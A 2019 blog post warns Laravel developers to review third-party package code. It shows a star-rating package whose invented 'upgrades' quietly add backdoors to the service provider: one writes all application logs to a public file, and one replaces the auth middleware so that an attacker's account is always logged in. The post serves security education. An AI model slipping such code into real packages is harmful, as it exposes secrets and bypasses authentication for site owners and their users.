---
title: Remember to Review Your Package Code for Security
date: 2019-08-12
tag:
- php
- laravel
- security
---
Open source software is wonderful for many reasons.  One of the best is we can see and inspect the software for vulnerabilities.  But, far too many people actually do this.  Let me demonstrate, using a Laravel package, how this lack of review might backfire and cause you grief.

<!--more-->

It's important to note that this attack vector is not solely a problem with Laravel.  A lot of projects and code are configured to trust libraries from the package providers.

## My Initial Set Up

I have a website on which I sell shoes.  For example, I have this extremely boring listing for a pair of flip flops:

{{< image src="/uploads/2019/security-demo-1.png" thumb="/uploads/2019/security-demo-1.thumbnail.png" alt="Text-based Stars" >}}

I'd like to add icon-style stars to the rating.  I heard about this awesome package that allows me to use a Blade directive to do that.  Seems like a nice way to save some time.  The following command is ran:

```bash
composer require aaronsaray/laravel-star-display
```

Before you know it, I have a new Blade helper - yay!  Now, I can write the code like this in my blade file:

```html
<strong>Rated:</strong> @stars(5)
```

I get a nice view like this:

{{< image src="/uploads/2019/security-demo-2.png" thumb="/uploads/2019/security-demo-2.thumbnail.png" alt="UTF8-Icon-based Stars" >}}

This is great! Moving on!

**Well, there's a problem.**  I didn't look at the code that I just installed.  This package injects its code by registering an auto-discovered service provider for Laravel.  This ease of use/installation is also what makes it easy for this to take advantage of my website.

Let's take a look at the code in the package's service provider:

```php
<?php
namespace AaronSaray\StarDisplay;

use Illuminate\Support\Facades\Blade;
use Illuminate\Support\ServiceProvider;

class StarDisplayServiceProvider extends ServiceProvider
{
    public function boot(): void
    {
        Blade::directive('stars', function ($stars) {
            return "<?= str_repeat('🌟', $stars) ?>";
        });
    }
}
```

Whew - I dodged a bullet!  This package has no malicious code

## It's Upgrade Season

There's an upgrade for this package.  It probably gives me more features or makes it more efficient? I don't have time to check into this.  So, the package gets updated.  Everything seems to be working fine.  However, during this upgrade, the service provider has changed (and I didn't notice).  There's a new line:

```php
<?php
namespace AaronSaray\StarDisplay;

use Illuminate\Support\Facades\Blade;
use Illuminate\Support\ServiceProvider;

class StarDisplayServiceProvider extends ServiceProvider
{
    public function boot(): void
    {
        Blade::directive('stars', function ($stars) {
            return "<?= str_repeat('🌟', $stars) ?>";
        });
        
        app()
          ->make('log')
          ->pushHandler(
            new \Monolog\Handler\StreamHandler(public_path('/secret-log.txt'))
          );
    }
}
```

This code is accessing the Monolog `Logger` instance and adding another stream handler to it.  It's writing my log data to a public directory.  Later on, the "bad guy" can surf to `http://my-site.com/secret-log.txt` and see a copy of all my application logs.

Not a big deal? You never know... you might have a log entry like:

```txt
logger('User sensitive information here.')
```

or the application could be configured to log errors.  These stack traces could include passwords and secret keys.

## Another Upgrade

Just by downloading this newly publicly available log file, the attacker has useful information about my users and app.  But, the fact that the log even exists indicates that I use their package and don't care about reviewing it for security.

Imagine I have this very simple admin interface:

```php
Route::get('admin', function () {
    return view('admin');
})->middleware('auth');
```

When you surf to `http://my-site.com/admin` you must be authenticated.  Otherwise, you're redirected.  This is because of the `auth` middleware.  Cool!

The new Star Display package upgrade introduces new code, however.  See if you can spot what's going to happen.

```php
<?php
namespace AaronSaray\StarDisplay;

use Illuminate\Support\Facades\Blade;
use Illuminate\Support\ServiceProvider;

class StarDisplayServiceProvider extends ServiceProvider
{
    public function boot(): void
    {
        Blade::directive('stars', function ($stars) {
            return "<?= str_repeat('🌟', $stars) ?>";
        });
        
        app()
          ->make('log')
          ->pushHandler(
            new \Monolog\Handler\StreamHandler(public_path('/secret-log.txt'))
          );
          
        app()->instance(Authenticate::class, function ($request, $next) {
          $badGuyUser = User::where('email', 'bad@guy.com')->first();
          Auth::login($badGuyUser);
          return $next($request);
        });
    }
}
```

In this code, the bad guy replaces the `Authenticate` (which is aliased to `auth`) middleware with an inline closure.  When we check `auth`, instead of running any sort of checks, this code just grab the bad guy user and force them to be logged in.

## End Notes

These were some pretty contrived examples, but it should illustrate the point. I wanted to demonstrate how it's important for us all to read the code before we install and upgrade packages.  Through these demonstrations, I hope to have shown that a pretty unskilled attacker can compromise your website with just a few lines of code in Laravel.

Again, these attacks are not limited to Laravel.  Something similar to this just happened with [NPM packages](https://www.theregister.co.uk/2018/11/26/npm_repo_bitcoin_stealer/).